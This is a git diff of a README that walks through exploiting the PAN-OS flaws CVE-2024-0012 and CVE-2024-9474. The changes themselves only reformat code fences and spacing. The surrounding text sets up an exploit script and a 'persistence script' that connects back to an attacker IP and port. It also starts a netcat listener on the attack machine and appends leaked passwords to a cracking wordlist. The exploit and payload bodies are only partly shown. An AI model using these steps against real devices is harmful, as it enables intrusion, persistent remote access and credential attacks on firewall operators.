@@ -32,18 +32,18 @@ CVE: CVE-2024-0012 and `CVE-2024-9474`
 6. Press `ctrl+O` and then enter to write out the file, then press `ctrl+S` to save, then press `ctrl+X` to exit the program
 7. `chmod +x PoC.py`
    
-
 ### Persistence Script Setup:
 
 1. Perform the following command: `nano pan_os_comm.py`
 2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
 
 #### (ATTACKER MACHINE)
-```
+
+```bash
 nc -lvnp 63842
 ```
 
-```
+```python
 #!/usr/bin/env python3
 
 import socket
@@ -79,7 +79,8 @@ Through OSINT and recon, we have located a list of compromised passwords from us
 
 1. Locate your `rockyou.txt` file and open using sudo.
 2. Once open, append the below to list of passwords to the to the list.
-```
+
+```bash
 sudo nano /usr/share/wordlists/rockyou.txt
 ```
 
@@ -87,11 +88,9 @@ sudo nano /usr/share/wordlists/rockyou.txt
 - `Ctrl+O`
 - `ctrl+X`
 
-
-
 #### PASSWORD LIST:  
 
-```
+```text
 Summer2025
 JohnDoe123
 Password123!
